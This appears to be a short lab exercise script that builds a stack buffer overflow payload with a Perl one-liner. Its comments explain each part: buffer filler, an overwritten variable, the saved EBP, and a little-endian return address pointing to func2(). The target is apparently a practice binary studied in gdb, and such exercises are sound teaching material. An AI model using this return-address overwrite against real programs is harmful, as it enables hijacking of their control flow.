# generates input needed for program, the input is as follows 

# "A"x16 → Fills the buffer (16 bytes).
# "\xBC\xD3\xFF\xFF" → Overwrites number with placeholder data (Little Endian).
# "B"x8 → Fills the unknown padding space.
# "\xD8\xD3\xFF\xFF" → Saved EBP (original value to prevent crashes).
# "\x6E\x62\x55\x56" → Overwrites return address with func2() (0x5655626e in Little Endian).

# of course you will have to run the gdb commands to get the addresses for your vm, make sure you take of ASLR etc :)
perl -e 'print "A"x16 . "\xBC\xD3\xFF\xFF" . "B"x8 . "\xD8\xD3\xFF\xFF" . "\x6E\x62\x55\x56"' > exploit_input